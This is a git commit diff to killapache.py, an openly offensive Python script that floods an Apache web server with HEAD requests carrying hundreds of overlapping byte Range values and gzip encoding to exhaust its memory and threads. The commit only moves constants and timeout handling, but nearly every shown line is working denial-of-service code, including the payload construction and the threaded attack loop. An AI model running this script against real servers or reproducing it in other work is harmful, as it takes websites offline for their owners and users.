942b8d24f3a60d67874349cb4f0f55a9f26b7589
stamparm <stamparm@Work.(none)>
2011-10-03 13:41:51 +0200

    minor update

--- killapache.py
+++ killapache.py
@@ -7,17 +7,26 @@ VERSION = "0.1a"
 AUTHOR  = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
 LICENSE = "Public domain (FREE)"
 
+SLEEP_TIME = 5
+RECV_SIZE = 100
+RANGE_NUMBER = 1024
+
 def attack(target):
     def _send(recv=False):
         host, port = target.split(':') if ':' in target else (target, 80)
-        payload = ",".join("5-%d" % item for item in xrange(1, 1024))
+        payload = ",".join("5-%d" % item for item in xrange(1, RANGE_NUMBER))
         packet = "HEAD / HTTP/1.1\r\nHost: %s\r\nRange:bytes=0-,%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n" % (target, payload)
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, int(port)))
             s.send(packet)
             if recv:
-                return s.recv(100)
+                return s.recv(RECV_SIZE)
+        except Exception, msg:
+            if 'timed out' in str(msg):
+                print "\r(i) Server seems to be choked ('%s')" % msg
+            else:
+                raise
         finally:
             s.close()
 
@@ -38,13 +47,11 @@ def attack(target):
                 except Exception, msg:
                     if 'new thread' in str(msg):
                         print "(i) Maximum number of new threads reached (%d)" % len(threads)
-                    elif 'timed out' in str(msg):
-                        print "(i) Server seems to be choked ('%s')" % msg
                     else:
                         print "(x) Exception occured ('%s')" % msg
                 finally:
-                    print "(o) Waiting for 5 seconds to acquire new threads"
-                    time.sleep(5)
+                    print "(o) Waiting for %d seconds to acquire new threads" % SLEEP_TIME
+                    time.sleep(SLEEP_TIME)
                     print
         except KeyboardInterrupt:
             print "\r(x) Ctrl-C was pressed"
